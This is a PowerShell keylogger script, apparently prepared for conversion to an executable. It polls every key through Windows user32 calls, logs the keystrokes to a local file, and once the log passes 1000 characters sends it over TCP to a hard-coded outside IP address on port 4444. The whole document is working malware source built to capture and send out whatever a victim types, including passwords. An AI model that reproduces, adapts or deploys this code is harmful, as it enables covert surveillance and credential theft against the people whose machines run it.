##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uK1
##Nc3NCtDXThU=
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ4dI=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ4tI=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlaDjofG5iZk2X79R3oXSsCIsqKo1L23+vPgtCLeTIgHBFl2nyfAD06kF/cKUJU=
##Kc/BRM3KXhU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
Function Send-TCPMessage { 
    Param ( 
            [Parameter(Mandatory=$true, Position=0)]
            [ValidateNotNullOrEmpty()] 
            [string] 
			#$EndPoint
			$IP
        , 
            [Parameter(Mandatory=$true, Position=1)]
            [int]
            $Port
        , 
            [Parameter(Mandatory=$true, Position=2)]
            [string]
            $Message
    ) 
    Process {
        # Setup connection 
        #$IP = [System.Net.Dns]::GetHostAddresses($EndPoint) 
        $Address = [System.Net.IPAddress]::Parse($IP) 
        $Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 
    
        # Setup stream wrtier 
        $Stream = $Socket.GetStream() 
        $Writer = New-Object System.IO.StreamWriter($Stream)

        # Write message to stream
        $Message | % {
            $Writer.WriteLine($_)
            $Writer.Flush()
        }
    
        # Close connection and stream
        $Stream.Close()
        $Socket.Close()
    }
}
$Title = "Keylogger"
$host.UI.RawUI.WindowTitle = $Title
#Import checking key status.
$Sig1 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Sig1 -Name Keyboard -Namespace PsOneApi

#Set of win-apis to get "correct values" for ToUnicode - to translate key_num better
$Sig2 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$Sig3 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@
$Sig4 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
# Map Virtual Key
Add-Type -MemberDefinition $Sig2 -Name MapVkey -Namespace PsOneApi
# Map Keboard State for multi button operations
Add-Type -MemberDefinition $Sig3 -Name GetKBS -Namespace PsOneApi
# Translate key to unicode
Add-Type -MemberDefinition $Sig4 -Name ToUni -Namespace PsOneApi
$file = ".\out.txt"
$ret_addr = "150.4.24.15"
$ret_port = 4444
while($true){
    Start-Sleep -Milliseconds 5
    for ($key_num=8; $key_num -le 254; $key_num++){
        $key_pressed = [PsOneApi.Keyboard]::GetAsyncKeyState($key_num)
        if ($key_pressed -eq -32767){
            #Get virtual key (also differentiate between right and left)
            #The number 3 - The uCode parameter is a scan code and is translated into a virtual-key code that distinguishes between left- and right-hand keys.
            $vk = [PsOneApi.MapVkey]::MapVirtualKey($key_num,3)
            #Get key states to check for multipress
            $kb = New-Object Byte[] 256
            $kbs = [PsOneApi.GetKBS]::GetKeyboardState($kb)
            #Translate to unicode - Uses keynum vk and kbs to save the unicode to t_char (translated char) (0 is flags for menu)
            #Buffer for growing string
            $t_char = New-Object -TypeName System.Text.StringBuilder
            #$uni_test = [PsOneApi.ToUni]::ToUnicode(81,34,1,$t_char,$t_char.Capacity,0)
            $uni_operation = [PsOneApi.ToUni]::ToUnicode($key_num,$vk,$kb,$t_char,$t_char.Capacity,0)
            if ($uni_operation){
                #Saving every key to file
                Add-Content -Path $file -Value $t_char -NoNewLine
            }
			$content = [System.IO.File]::ReadAllText($file)
			$length = $content.Length
			#Write-Host $content $length
			if ($length -gt 1000){
				Send-TCPMessage -IP $ret_addr -Port $ret_port -Message $content
				Set-Content -Path $file -Value ""
			}
        }
    }
}
